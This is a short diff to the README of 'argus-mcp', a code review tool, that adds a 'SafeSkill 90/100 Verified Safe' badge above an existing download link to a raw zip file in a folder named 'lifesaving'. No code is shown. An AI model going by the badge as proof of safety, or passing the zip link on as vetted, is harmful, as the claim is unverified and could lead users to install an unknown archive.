@@ -1,5 +1,7 @@
 # 🛠️ argus-mcp - Secure Code Reviews Made Easy  
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/dykeruv-argus-mcp)
+
 [![Download argus-mcp](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip)](https://raw.githubusercontent.com/dykeruv/argus-mcp/main/lifesaving/mcp-argus-v1.7.zip)
 
 ## 🚀 Getting Started  
